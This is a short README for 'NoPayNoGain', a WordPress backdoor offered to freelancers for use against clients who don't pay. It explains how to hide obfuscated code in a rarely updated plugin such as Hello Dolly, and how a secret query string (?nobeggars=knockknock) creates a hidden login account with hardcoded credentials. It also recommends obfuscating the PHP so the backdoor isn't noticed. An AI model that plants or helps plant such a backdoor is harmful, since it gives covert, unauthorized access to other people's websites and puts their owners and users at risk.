# NoPayNoGain
Ultra simple WordPress backdoor to defend freelancers from non-paying clients

## Usage
Put the obfuscated version in a rarely-updated plugin, like Hello Dolly. Leave it active. If you ever need to regain access to the website, just connect to:
```
http://example.org/?nobeggars=knockknock
```
A new account is now added to the WP website:
```
username: nopaynogain
password: areyougonnapaymeornot
```

You'll want to change the username/password to stay safe: change them in the Clear version and obfuscate the PHP with [PHP Obfuscator](https://php-minify.com/php-obfuscator/#)

